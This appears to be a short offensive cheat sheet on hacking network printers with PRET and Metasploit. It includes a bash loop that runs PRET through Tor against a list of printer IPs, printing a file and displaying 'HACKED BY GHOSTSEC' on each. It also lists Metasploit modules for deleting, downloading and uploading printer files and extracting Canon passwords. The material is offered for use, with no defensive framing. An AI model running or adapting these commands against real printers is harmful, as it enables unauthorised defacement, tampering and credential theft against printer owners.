# Printers

## 01 - PRET

### 1.1 - Help Menu

```
$ ./pret.py <printer_target_IP> pjl

<printer_target_IP>:/> help

Available commands (type help <topic>):
=======================================
append  delete    edit    free  info    mkdir      printenv  set        unlock
cat     destroy   env     fuzz  load    nvram      put       site       version
cd      df        exit    get   lock    offline    pwd       status
chvol   disable   find    help  loop    open       reset     timeout
close   discover  flood   hold  ls      pagecount  restart   touch
debug   display   format  id    mirror  print      selftest  traversal
```

### 1.2 - Usage

In this case we are connecting to the printer that is a ps printer language.

`$ ./pret.py <IP> ps`

Lastly you can connect to local USB printers for example

`$ ./pret.py /dev/usb/lp0 pjl`

### 1.3 - Automated

`$ cat pret_commands.txt`

---

```
print ./message-by-ghostsec.txt
display "HACKED BY GHOSTSEC"
quit
```

`$ cat auto_print_pret.sh`

---

```bash
#!/bin/bash
while read -r line
do
    ip="$line"
    torify ./pret.py $ip pjl -q -i ./pret_commands.txt
done < "./printers_ips.txt"
```

## 02 - Metasploit

### 2.1 - Auxiliary

TODO: Check every MSF auxiliary module related to printers

#### 2.1.1 - Generic

```
auxiliary/scanner/printer/printer_list_dir

auxiliary/scanner/printer/printer_env_vars

auxiliary/scanner/printer/printer_delete_file

auxiliary/scanner/printer/printer_download_file

auxiliary/scanner/printer/printer_upload_file

auxiliary/scanner/printer/printer_ready_message

auxiliary/scanner/printer/printer_version_info

auxiliary/scanner/printer/printer_list_volumes
```

#### 2.1.2 - Canon

`auxiliary/scanner/printer/canon_iradv_pwd_extract`

#### 2.1.3 HP

```
auxiliary/scanner/snmp/snmp_enum_hp_laserjet

auxiliary/scanner/http/hp_sys_mgmt_login
```